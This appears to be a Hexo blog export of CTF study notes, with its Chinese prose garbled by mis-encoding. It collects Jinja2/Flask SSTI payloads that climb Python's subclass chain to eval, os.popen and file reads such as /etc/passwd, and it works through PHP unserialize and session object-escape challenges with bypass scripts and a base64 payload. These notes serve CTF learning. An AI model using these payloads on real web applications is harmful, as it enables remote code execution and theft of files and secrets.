<p>jinjiaçš„è¯­è¨€ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ§åˆ¶ç»“æ„ &#123;% %&#125;</span><br><span class="line">å˜é‡å–å€¼ &#123;&#123; &#125;&#125;</span><br><span class="line">æ³¨é‡Š &#123;# #&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p> ï¼šæŸ¥çœ‹æ‰€æœ‰çš„æ¨¡å—</p>
<p>osæ¨¡å—éƒ½æ˜¯ä»warnings.catch_warningsæ¨¡å—å…¥æ‰‹çš„ï¼Œåœ¨æ‰€æœ‰æ¨¡å—ä¸­æŸ¥æ‰¾catch_warningsçš„ä½ç½®ï¼Œä¸ºç¬¬59ä¸ª</p>
<p>åˆ©ç”¨åˆ°çš„æ˜¯<strong>func_globals.keys()</strong> ï¼šæŸ¥çœ‹å…¨å±€å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27; )</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹flagæ–‡ä»¶æ‰€åœ¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;fl4g&quot;).read()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>è¯»å–æ–‡ä»¶ åˆ©ç”¨åˆ°çš„æ˜¯objectå¯¹è±¡ä¸‹çš„fileç±»çš„readå‡½æ•°</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/[python](https://so.csdn.net/so/search?q=python&amp;spm=1001.2101.3001.7020)/">https://xuanxuanblingbling.github.io/ctf/web/2019/01/02/[python](https://so.csdn.net/so/search?q=python&amp;spm=1001.2101.3001.7020)/</a></p>
<p>åŸºç¡€ç±»çš„æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__  è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡ï¼ˆç±»ï¼‰</span><br><span class="line">__mro__    è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚</span><br><span class="line">__base__   è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»</span><br><span class="line">// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„</span><br><span class="line">__subclasses__   æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨</span><br><span class="line">__init__  ç±»çš„åˆå§‹åŒ–æ–¹æ³•</span><br><span class="line">__globals__  å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¸¸è§çš„åŸºç¡€è°ƒç”¨ç±»å‡½æ•°æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()</span><br><span class="line"># è¿”å›å­ç±»çš„åˆ—è¡¨ [,,,...]</span><br><span class="line">#ä»ä¸­éšä¾¿é€‰ä¸€ä¸ªç±»,æŸ¥çœ‹å®ƒçš„__init__</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[30].__init__</span><br><span class="line">&lt;slot wrapper &#x27;__init__&#x27; of &#x27;object&#x27; objects&gt;</span><br><span class="line"># wrapperæ˜¯æŒ‡è¿™äº›å‡½æ•°å¹¶æ²¡æœ‰è¢«é‡è½½ï¼Œè¿™æ—¶ä»–ä»¬å¹¶ä¸æ˜¯functionï¼Œä¸å…·æœ‰__globals__å±æ€§</span><br><span class="line">#å†æ¢å‡ ä¸ªå­ç±»ï¼Œå¾ˆå¿«å°±èƒ½æ‰¾åˆ°ä¸€ä¸ªé‡è½½è¿‡__init__çš„ç±»ï¼Œæ¯”å¦‚</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__subclasses__()[5].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]</span><br><span class="line">#ç„¶åç”¨evalæ‰§è¡Œå‘½ä»¤å³å¯</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="1-è·å–åŸºç±»"><a href="#1-è·å–åŸºç±»" class="headerlink" title="1.è·å–åŸºç±»"></a>1.è·å–åŸºç±»</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//è·å–åŸºæœ¬ç±»</span><br><span class="line">```bash</span><br><span class="line">&#x27;&#123;&#123;[].__class__&#125;&#125;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è·å–æ‰€æœ‰ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è·å–configå¯¹è±¡ä¸requestå¯¹è±¡ç±»</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#123;&#123;url_for.__globals__&#125;&#125;&#x27;</span><br><span class="line">&#x27;&#123;&#123;config&#125;&#125;#å³æŸ¥çœ‹æƒé™&#x27;</span><br><span class="line">&#x27;&#123;&#123; config.SQLALCHEMY_DATABASE_URI &#125;&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>python</p>
<p>è¯»å–æ–‡ä»¶ç±»ï¼Œ&lt;type â€˜fileâ€™&gt; fileä½ç½®ä¸€èˆ¬ä¸º40ï¼Œç›´æ¥è°ƒç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&lt;class â€˜site._Printerâ€™&gt; è°ƒç”¨osçš„popenæ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¦‚æœsystemè¢«è¿‡æ»¤ï¼Œç”¨osçš„listdirè¯»å–ç›®å½•+fileæ¨¡å—è¯»å–æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&lt;class â€˜subprocess.Popenâ€™&gt; ä½ç½®ä¸€èˆ¬ä¸º258</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;</span><br><span class="line">&#x27;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;ls /flasklight&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;</span><br><span class="line">&#x27;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&lt;class â€˜warnings.catch_warningsâ€™&gt;<br>ä¸€èˆ¬ä½ç½®ä¸º59ï¼Œå¯ä»¥ç”¨å®ƒæ¥è°ƒç”¨fileã€osã€evalã€commandsç­‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#è°ƒç”¨file</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()      #æŠŠ read() æ”¹ä¸º write() å°±æ˜¯å†™æ–‡ä»¶</span><br><span class="line">#è¯»æ–‡ä»¶</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line">object.__subclasses__()[40](r&#x27;C:\1.php&#x27;).read()</span><br><span class="line">#å†™æ–‡ä»¶</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line">object.__subclasses__()[40](&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line"></span><br><span class="line">#è°ƒç”¨eval</span><br><span class="line">[].__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)</span><br><span class="line">#è°ƒç”¨systemæ–¹æ³•</span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;)</span><br><span class="line">root</span><br><span class="line">0</span><br><span class="line">#è°ƒç”¨commandsè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>python3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#è¯»å–æ–‡ä»¶ä¸å†™æ–‡ä»¶ç±»</span><br><span class="line">&#x27;&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[%27open%27](%27/etc/passwd%27).read()&#125;&#125;&#x27;</span><br><span class="line">#æ‰§è¡Œå‘½ä»¤</span><br><span class="line">&#x27;&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&#125;&#125;&#x27;</span><br><span class="line">#å‘½ä»¤æ‰§è¡Œï¼š</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">#æ–‡ä»¶æ“ä½œ</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="payloadå¤§å…¨"><a href="#payloadå¤§å…¨" class="headerlink" title="payloadå¤§å…¨"></a>payloadå¤§å…¨</h2><p>åŠç»•è¿‡payloadå¤§å…¨_HoAdâ€™blog-CSDNåšå®¢](<a href="https://blog.csdn.net/weixin_54515836/article/details/113778233">https://blog.csdn.net/weixin_54515836/article/details/113778233</a>)</p>
<p><img src="sql.assets/1596031074.jpg!small" alt="img"></p>
<h1 id="SMARTY"><a href="#SMARTY" class="headerlink" title="SMARTY"></a>SMARTY</h1><p><a href="https://www.freebuf.com/column/219913.html">Smarty SSTI - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
<h2 id="catã€tacã€nlä¸‰è€…çš„åŒºåˆ«ï¼š"><a href="#catã€tacã€nlä¸‰è€…çš„åŒºåˆ«ï¼š" class="headerlink" title="catã€tacã€nlä¸‰è€…çš„åŒºåˆ«ï¼š"></a>catã€tacã€nlä¸‰è€…çš„åŒºåˆ«ï¼š</h2><p>catè¯»å–æ–‡ä»¶çš„å†…å®¹ï¼Œå°†æ–‡ä»¶çš„å†…å®¹æŒ‰æ­£å¸¸çš„é¡ºåºæ‰“å‡ºï¼Œè€Œtacä¸catæ°æ°ç›¸åï¼Œå®ƒä¹Ÿå¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œè¯»å–åªä¸è¿‡æ˜¯æŒ‰é€†åºæ‰“å‡ºæ–‡ä»¶å†…å®¹ï¼Œè‡³äºnlï¼Œå®ƒæ˜¯åœ¨æ‰“å‡ºæ–‡ä»¶å†…å®¹çš„åŒæ—¶ç»™æ¯è¡ŒåŠ äº†è¡Œå·ã€‚</p>
]]></content>
      <categories>
        <category>SSTI</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>unserialize</title>
    <url>/2021/12/26/unserialize/</url>
    <content><![CDATA[<h1 id="UNSERIALIZE"><a href="#UNSERIALIZE" class="headerlink" title="UNSERIALIZE"></a>UNSERIALIZE</h1><p>Web_php_unserialize  æ”»é˜²ä¸–ç•Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;           <span class="comment">//å®šä¹‰ä¸€ä¸ªç±»</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;			<span class="comment">//å˜é‡å±æ€§</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;      <span class="comment">//ç±»æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; 		<span class="comment">//wakeupå‡½æ•° è¿”å›index.phpæ‰€ä»¥å¿…é¡»ç»•è¿‡æ¬¡å‡½æ•°</span></span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php     //flagæ‰€åœ¨æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;        		 <span class="comment">//åˆ¤æ–­æ˜¯å¦ä¼ å…¥å‚æ•°</span></span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);  	<span class="comment">//å¯¹ä¼ å…¥å‚æ•°è¿›è¡Œbase64åŠ å¯†</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; <span class="comment">//æ­£åˆ™æ£€æŸ¥</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>);      <span class="comment">//è¿›è¡Œååºåˆ—åŒ–</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); 	<span class="comment">//è¿”å›æƒ³è¦ç»“æœ</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.Demo  ä¸­fileä¸ºå˜é‡ï¼Œå¯ä»¥å°†fl4g.phpä½œä¸ºå˜é‡ä¼ è¿›å»</p>
<p>2.function __wakeup() {<br>    if ($this-&gt;file != â€˜index.phpâ€™)</p>
<p>å¼ºè¡Œè¦æ±‚è¾“å…¥çš„å˜é‡ä¸ºindex.php è€ƒè™‘ç»•è¿‡</p>
<p>3.(preg_match(â€˜/[oc]:\d+:/iâ€™</p>
<p>æ­£åˆ™åŒ¹é…ï¼Œè¿‡æ»¤æ‰ä»¥o/c:int   \d  æ˜¯æ•´æ•°   /iåŒºåˆ†å¤§å°å†™</p>
<p>åœ¨æ–‡ä¸­è¿‡æ»¤æ‰çš„æ˜¯åºåˆ—åŒ–åå¾—åˆ°çš„O:4  ,æ”¹ä¸ºO:+4å³å¯è¿‡æ»¤</p>
<p>4.$var = base64_decode($_GET[â€˜varâ€™]);</p>
<p>è¾“å…¥çš„ç»“æœè¦base64åŠ å¯†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;           <span class="comment">//å®šä¹‰ä¸€ä¸ªç±»</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;			<span class="comment">//å˜é‡å±æ€§</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;      <span class="comment">//ç±»æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; 		<span class="comment">//wakeupå‡½æ•° è¿”å›index.phpæ‰€ä»¥å¿…é¡»ç»•è¿‡æ¬¡å‡½æ•°</span></span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php     //flagæ‰€åœ¨æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line"><span class="variable">$C</span>=serialize(<span class="string">&#x27;$A&#x27;</span>);</span><br><span class="line"><span class="variable">$C</span>=str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$C</span>);</span><br><span class="line"><span class="variable">$C</span>=str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$C</span>);</span><br><span class="line">var_dump(<span class="variable">$C</span>);</span><br><span class="line">var_dump(base64_decode(<span class="variable">$C</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</p>
<h1 id="sessionååºåˆ—åŒ–"><a href="#sessionååºåˆ—åŒ–" class="headerlink" title="sessionååºåˆ—åŒ–"></a>sessionååºåˆ—åŒ–</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æœ€åä¸€ä¸ªifè¯­å¥å¯ä»¥è¾¾åˆ°ç›®çš„</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&#x27;show_image&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&#x27;ZDBnM19mMWFnLnBocA==&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»è¿‡è¿‡æ»¤åæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€ç§æ˜¯å¢å¤šï¼Œä¸€ç§æ˜¯å‡å°‘</p>
<p>è¯¥é¢˜ä¸ºå‡å°‘ï¼Œæœ‰ä¸¤ç§è§£å†³æ–¹æ³•ï¼Œä¸€ç§æ˜¯å€¼é€ƒé€¸ï¼Œå¦å¤–ä¸€ç§æ˜¯é”®é€ƒé€¸</p>
<p><a href="https://blog.csdn.net/a3320315/article/details/104118688/">(47æ¡æ¶ˆæ¯) å®‰æ´µæ¯2019 easy_serialize_php (ååºåˆ—åŒ–ä¸­çš„å¯¹è±¡é€ƒé€¸)_a3320315çš„åšå®¢-CSDNåšå®¢_easy_serialize_php</a></p>
]]></content>
      <categories>
        <category>unserialize</category>
      </categories>
      <tags>
        <tag>unserialize</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/01/16/%E9%9A%8F%E7%AC%94/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>buuctf*</title>
    <url>/2022/01/24/upload/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/Z_Grant/article/details/100606382">(47æ¡æ¶ˆæ¯) æ–‡ä»¶åŒ…å«â€”â€”åŸç†åŠåº”ç”¨å’Œé˜²æŠ¤ï¼ˆ1ï¼‰_Z_Grantçš„åšå®¢-CSDNåšå®¢_æ–‡ä»¶åŒ…å«çš„ä½œç”¨</a></p>
<p><a href="https://blog.csdn.net/Z_Grant/article/details/100606382">https://blog.csdn.net/Z_Grant/article/details/100606382</a></p>
<p><a href="https://blog.csdn.net/aweiname2008/article/details/119522187">(47æ¡æ¶ˆæ¯) ä»0åˆ°1 CTFeræˆåŠŸä¹‹è·¯ã€‹ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´â€”å­¦ä¹ ç¬”è®°_aweiname2008çš„åšå®¢-CSDNåšå®¢_ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</a></p>
]]></content>
      <categories>
        <category>buuctf*</category>
      </categories>
      <tags>
        <tag>buuctf*</tag>
      </tags>
  </entry>
</search>
